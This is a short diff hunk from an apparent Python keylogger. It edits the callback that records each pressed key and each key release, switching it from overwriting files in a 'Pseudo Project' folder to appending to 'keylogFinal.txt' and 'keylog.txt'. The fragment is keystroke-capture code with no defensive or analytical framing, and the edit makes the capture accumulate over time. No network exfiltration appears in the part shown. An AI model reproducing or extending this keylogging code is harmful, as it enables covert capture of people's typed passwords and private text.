@@ -5,11 +5,11 @@ import time
 def on_key_event(key, is_press=True):
     try:
         if is_press:
-            with open("Pseudo Project/keylogFinal.txt", "w", encoding='utf-8') as f:
+            with open("keylogFinal.txt", "a", encoding='utf-8') as f:
                 char = key.char if hasattr(key, 'char') else str(key)
                 f.write(char)
         else:
-            with open("Pseudo Project/keylog.txt", "w", encoding='utf-8') as f:
+            with open("keylog.txt", "a", encoding='utf-8') as f:
                 f.write('Key released: {0}\n'.format(key))
     except AttributeError:
         pass  # Handle special keys gracefully
